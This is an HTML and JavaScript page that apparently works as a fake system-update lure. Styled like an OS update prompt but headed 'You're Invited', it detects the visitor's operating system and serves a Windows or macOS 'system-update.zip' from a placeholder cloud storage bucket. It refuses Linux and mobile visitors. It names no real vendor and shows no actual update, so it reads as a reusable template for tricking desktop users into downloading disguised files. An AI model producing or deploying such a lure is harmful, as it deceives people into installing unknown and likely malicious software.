<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=1024">
    <title>System Update Available</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #fafafa 0%, #f0f0f0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .container {
            background: white;
            width: 100%;
            max-width: 500px;
            padding: 80px 50px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
            text-align: center;
            border: 1px solid rgba(0, 0, 0, 0.04);
        }

        .seal {
            font-size: 32px;
            margin-bottom: 20px;
            display: block;
        }

        h1 {
            font-size: 28px;
            font-weight: 300;
            color: #1a1a1a;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }

        .subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 50px;
            font-weight: 300;
            letter-spacing: 0.3px;
        }

        .divider {
            width: 40px;
            height: 1px;
            background: #0078d4;
            margin: 0 auto 40px;
        }

        .info {
            background: transparent;
            padding: 0;
            margin-bottom: 50px;
            border: none;
            font-size: 13px;
            color: #1a1a1a;
            text-align: center;
        }

        .info-label {
            display: block;
            color: #666;
            font-weight: 400;
            margin-bottom: 6px;
            font-size: 12px;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        .info-value {
            font-size: 16px;
            color: #0078d4;
            font-weight: 500;
        }

        .download-btn {
            background: #0078d4;
            color: white;
            border: none;
            padding: 14px 48px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            margin-bottom: 40px;
        }

        .download-btn:hover {
            background: #005a9e;
            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.25);
            transform: translateY(-1px);
        }

        .download-btn:active {
            background: #004578;
            transform: translateY(0);
        }

        .download-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            box-shadow: none;
            transform: none;
        }

        .footer {
            font-size: 11px;
            color: #999;
            letter-spacing: 0.3px;
            line-height: 1.8;
        }

        .footer-divider {
            width: 40px;
            height: 1px;
            background: #e0e0e0;
            margin: 20px auto 20px;
        }

        @media (max-width: 768px) {
            body {
                display: none;
            }
            .mobile-warning {
                display: flex;
                width: 100%;
                height: 100vh;
                align-items: center;
                justify-content: center;
                font-size: 16px;
                color: #323232;
                background: #f5f5f5;
                text-align: center;
                padding: 20px;
            }
        }

        .mobile-warning {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <span class="seal">📋</span>

        <h1>You're Invited</h1>
        <p class="subtitle">System Update 2.0.0</p>

        <div class="divider"></div>

        <div class="info">
            <span class="info-label">Your System</span>
            <span class="info-value" id="osDisplay">Detecting...</span>
        </div>

        <button class="download-btn" id="downloadBtn">Accept & Download</button>

        <div class="footer">
            <div class="footer-divider"></div>
            <p>Version 2.0.0</p>
            <p style="margin-top: 4px;">Size: Approximately 50 MB</p>
        </div>
    </div>

    <div class="mobile-warning">
        <div>
            <p>Please use a desktop or laptop to download this update.</p>
            <p style="margin-top: 20px; font-size: 14px; color: #737373;">This page is designed for Windows and macOS only.</p>
        </div>
    </div>

    <script>
        const downloadBtn = document.getElementById('downloadBtn');
        const osDisplay = document.getElementById('osDisplay');

        function detectOS() {
            const userAgent = navigator.userAgent;
            let osName = 'Unknown';
            let osType = null;

            if (userAgent.includes('Win')) {
                osName = 'Windows';
                osType = 'windows';
            } else if (userAgent.includes('Mac')) {
                osName = 'macOS';
                osType = 'mac';
            } else if (userAgent.includes('Linux')) {
                osName = 'Linux';
                osType = 'linux';
            }

            return { osName, osType };
        }

        function getDownloadLink(osType) {
            const baseUrl = 'https://system-updates.YOUR_ACCOUNT_ID.r2.cloudflarestorage.com';
            const files = {
                windows: `${baseUrl}/windows-update.zip`,
                mac: `${baseUrl}/mac-update.zip`
            };
            return files[osType] || null;
        }

        function startDownload() {
            const { osName, osType } = detectOS();

            if (!osType || osType === 'linux') {
                alert(`System Update is not available for ${osName || 'your system'}`);
                return;
            }

            downloadBtn.disabled = true;
            const originalText = downloadBtn.textContent;
            downloadBtn.textContent = 'Downloading...';

            const downloadUrl = getDownloadLink(osType);

            if (!downloadUrl) {
                alert('Download link not available. Please configure R2 bucket URL in the page.');
                downloadBtn.disabled = false;
                downloadBtn.textContent = originalText;
                return;
            }

            // Trigger download
            const link = document.createElement('a');
            link.href = downloadUrl;
            link.download = osType === 'windows' ? 'system-update.zip' : 'system-update.zip';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // Reset button
            setTimeout(() => {
                downloadBtn.textContent = 'Download Complete ✓';
                setTimeout(() => {
                    downloadBtn.textContent = originalText;
                    downloadBtn.disabled = false;
                }, 2000);
            }, 1500);
        }

        // Initialize
        window.addEventListener('load', function() {
            const { osName, osType } = detectOS();
            osDisplay.textContent = osName;

            if (!osType || osType === 'linux') {
                downloadBtn.disabled = true;
                downloadBtn.textContent = `Not available for ${osName}`;
            }
        });

        downloadBtn.addEventListener('click', startDownload);
    </script>
</body>
</html>
